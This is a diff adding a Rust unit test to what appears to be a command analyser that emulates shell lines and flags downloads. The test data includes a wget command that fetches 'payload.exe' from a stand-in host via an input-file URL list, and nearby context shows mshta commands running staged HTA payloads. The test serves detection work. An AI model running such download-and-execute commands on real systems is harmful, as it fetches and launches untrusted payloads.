@@ -12843,7 +12843,7 @@ mshta C:/Temp/stage.hta"#,
 
 #[cfg(test)]
 mod wget_tests {
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -13232,6 +13232,36 @@ mshta payload.hta"#,
             )],
             "traits: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn wget_input_file_reads_tracked_url_list() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"echo https://wget-input-file.example/payload.exe>urls.txt"#,
+            &mut env,
+        );
+        interpret_line(r#"wget -i urls.txt -O payload.exe"#, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-input-file.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "wget -i tracked input file did not emit structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("payload.exe"),
+                Some(FsEntry::Download { src })
+                    if src == "https://wget-input-file.example/payload.exe"
+            ),
+            "wget -i tracked input file did not record destination: {:?}",
+            env.modified_filesystem
         );
     }
 
